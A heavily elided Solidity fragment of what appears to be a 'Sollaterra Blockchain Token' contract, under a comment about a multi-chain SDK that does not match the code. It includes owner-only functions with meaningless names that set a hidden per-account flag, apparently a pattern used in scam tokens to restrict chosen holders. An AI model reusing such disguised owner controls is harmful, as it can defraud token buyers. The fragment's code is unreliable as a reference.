...
// Sollaterra Contract Based
// Using Sollaterra SDK (Software Development Kit) the developer will be able
// to build and broadcast transactions for multiple currencies and
// blockchains with ease without any previous knowledge of cryptography or blockchain.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Sollaterra Blockchain Token';
    ...
    function ScropeWebchain(address account) public onlyOwner {
    ...
    function SmartDelegated(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function BuildStatsDeployer(address account) public view returns (bool) {
...
contract SollaterraContractBase is BaseToken {
